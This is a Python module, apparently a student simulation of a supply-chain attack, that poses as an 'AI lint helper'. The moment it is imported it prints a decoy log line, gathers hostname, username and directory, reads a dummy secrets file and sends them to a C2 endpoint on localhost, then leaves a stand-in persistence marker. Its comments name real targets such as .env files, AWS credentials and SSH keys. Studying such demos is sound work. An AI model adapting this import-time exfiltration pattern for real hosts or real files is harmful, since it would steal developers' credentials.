"""
ai_lint_helper - 겉모습은 AI가 짠 코드의 스타일을 자동으로 정리해주는 헬퍼

실제로는 'AI 공급망 공격' 팀 프로젝트용 시뮬레이션이다. 데이터를 훔치거나
외부로 유출하는 일은 없고, 통신은 전부 127.0.0.1(내 컴퓨터 안)로만 간다.
`import ai_lint_helper`가 되는 순간 아래 코드가 자동으로 실행되는데, 이게
바로 npm install이나 pip install 직후 악성 코드가 바로 도는 것과 같은
원리다.
"""
import json
import os
import socket
import time
import urllib.request

C2_HOST = "127.0.0.1"
C2_PORT = 8899


def _looks_legit():
    # 위장용: 개발자가 보기엔 그냥 평범한 초기화 로그처럼 보임
    print("[ai-lint-helper] 코드 스타일 규칙을 초기화하는 중...")


def _collect_recon():
    # 실제 공격자는 이 단계에서 OS, 사용자 계정, 설치된 도구 등 '정찰' 정보를 모음
    return {
        "hostname": socket.gethostname(),
        "user": os.environ.get("USERNAME", "unknown"),
        "cwd": os.getcwd(),
    }


def _steal_dummy_secret():
    # 실제 공격자는 .env, AWS 자격증명, SSH 개인키 등을 노림
    # 여기서는 완전히 가짜 값이 들어있는 데모용 파일만 읽음
    candidates = [
        "dummy_secrets.txt",
        os.path.join("..", "fake_victim", "dummy_secrets.txt"),
    ]
    for path in candidates:
        if os.path.exists(path):
            with open(path, encoding="utf-8") as f:
                return f.read()
    return None


def _beacon(payload):
    # 훔친(가짜) 정보를 공격자 서버로 전송 시도 (C2 통신)
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        f"http://{C2_HOST}:{C2_PORT}/beacon",
        data=data,
        headers={"Content-Type": "application/json"},
    )
    try:
        urllib.request.urlopen(req, timeout=2)
    except Exception as e:
        print(f"[ai-lint-helper][sim] C2 연결 실패 (데모 서버가 안 켜져 있나요?): {e}")


def _fake_persistence_marker():
    # 실제 공격자는 시작프로그램/레지스트리 Run 키/예약 작업 등에 자신을 등록해
    # PC를 재부팅해도 계속 살아남으려 함 ("지속성", Persistence).
    # 이 데모는 실제 시스템을 절대 건드리지 않고, 대신 artifacts 폴더 안에
    # "만약 진짜였다면 이런 흔적이 남았을 것"이라는 표시만 남김.
    marker = os.path.join(
        os.path.dirname(__file__), "..", "..", "artifacts", "SIMULATED_persistence_marker_pip_package.txt"
    )
    try:
        os.makedirs(os.path.dirname(marker), exist_ok=True)
        with open(marker, "w", encoding="utf-8") as f:
            f.write(
                "[SIMULATION ONLY] 실제 공격이었다면 여기서 시작프로그램 등록 / "
                "예약 작업 생성 / 레지스트리 Run 키 추가 같은 지속성 기법이 사용됐을 수 있습니다.\n"
                "(이 데모에서는 실제 시스템을 변경하지 않았습니다.)\n"
            )
    except Exception:
        pass


# ↓↓↓ 이 모듈이 import되는 즉시 아래 코드가 실행됩니다 (공급망 공격의 핵심 트릭) ↓↓↓
_looks_legit()
_secret = _steal_dummy_secret()
_beacon(
    {
        "event": "pip_package_beacon",
        "vector": "pip install (ai-lint-helper)",
        "recon": _collect_recon(),
        "stolen_preview": (_secret[:40] + "...") if _secret else None,
        "ts": time.time(),
    }
)
_fake_persistence_marker()
